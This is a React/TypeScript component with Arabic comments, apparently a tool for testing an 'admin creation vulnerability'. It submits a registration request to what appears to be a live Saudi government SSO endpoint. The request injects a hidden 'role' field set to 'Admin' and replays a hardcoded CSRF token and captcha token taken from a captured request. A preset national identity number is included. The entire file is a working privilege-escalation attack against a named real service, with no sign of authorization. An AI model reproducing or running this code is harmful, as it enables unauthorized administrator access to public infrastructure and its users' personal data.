      // ملف: SecurityTestForm.tsx
      import React, { useState } from 'react';
      import axios from 'axios';
      
      const SecurityTestForm: React.FC = () => {
        const [identityId, setIdentityId] = useState<string>('1030256059');
        const [birthDate, setBirthDate] = useState<string>('1990-01-01');
        const [captcha, setCaptcha] = useState<string>('ABCDE');
        const [role, setRole] = useState<string>('Admin');
        const [response, setResponse] = useState<string>('');
        const [error, setError] = useState<string>('');
      
        // 🔒 القيم الثابتة من الطلب الأصلي
        const CSRF_TOKEN = 'CfDJ8NN3LP0rkf9Djkrt6Go1YHvFH8lm6aJ848_6Hswc-sKaA5Zws2QyEDOkwY3E-PQPB7o8e6oRtNVO90mIuj0sPhanBGzg7zVFINnXXpTbH2hYj7RXYn4v87LsCZPAQcgLJlwXB-_JTdLPTWOC8qdueus';
        const CAPTCHA_TOKEN = '3SF2CtNx90zc9M9t3Z2OUABaVnhzQmTV0MeE7sMVQZjhnFekGoMh-yW3-bYDMQHgDBQTXafazLB_79n12grP-jQSAJZh8EkfNwJJ4x5waidwix6aYWca1eIwLka-nCOP';
      
        const handleSubmit = async (e: React.FormEvent) => {
          e.preventDefault();
          
          try {
            const formData = new URLSearchParams();
            formData.append('IdentityId', identityId);
            formData.append('BirthDate', birthDate);
            formData.append('DNT_CaptchaInputText', captcha);
            formData.append('role', role); // ⚠️ هذه ثغرة IDOR خطيرة
            formData.append('__RequestVerificationToken', CSRF_TOKEN);
            formData.append('DNT_CaptchaToken', CAPTCHA_TOKEN);
      
            const result = await axios.post(
              'https://ssoapp.balady.gov.sa/Account/RegisterRequest?returnurl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DGis.Portal.Umaps%26',
              formData,
              {
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                },
              }
            );
      
            setResponse(JSON.stringify(result.data, null, 2));
          } catch (err) {
            setError('فشل الاختبار: ' + (err as Error).message);
          }
        };
      
        return (
          <div className="h-[100vh] min-h-[100vh] bg-bl text-white">
            <h2>اختبار ثغرة إنشاء أدمن</h2>
            <form onSubmit={handleSubmit}>
              {/* الحقول المخفية للثغرة */}
              <input type="hidden" name="isGregorian" value="false" />
              
              <div className="form-group">
                <label>
                  رقم الهوية:
                  <input
                    type="text"
                    value={identityId}
                    onChange={(e) => setIdentityId(e.target.value)}
                    pattern="[0-9]{10}"
                    required
                  />
                </label>
              </div>
      
              <div className="form-group">
                <label>
                  تاريخ الميلاد:
                  <input
                    type="date"
                    value={birthDate}
                    onChange={(e) => setBirthDate(e.target.value)}
                    required
                  />
                </label>
              </div>
      
              <div className="form-group">
                <label>
                  كود الأمان:
                  <input
                    type="text"
                    value={captcha}
                    onChange={(e) => setCaptcha(e.target.value)}
                    required
                  />
                </label>
              </div>
      
              <div className="form-group">
                <label>
                  الصلاحية (الثغرة):
                  <input
                    type="text"
                    value={role}
                    onChange={(e) => setRole(e.target.value)}
                    hidden // ⚠️ إخفاء الحقل لا يحل المشكلة الأمنية!
                  />
                </label>
              </div>
      
              <button type="submit" className="btn-test">
                تشغيل الاختبار
              </button>
            </form>
      
            {response && (
              <div className="response-box">
                <h3>النتيجة:</h3>
                <pre>{response}</pre>
              </div>
            )}
      
            {error && <div className="error">{error}</div>}
          </div>
        );
      };
      
      export default SecurityTestForm;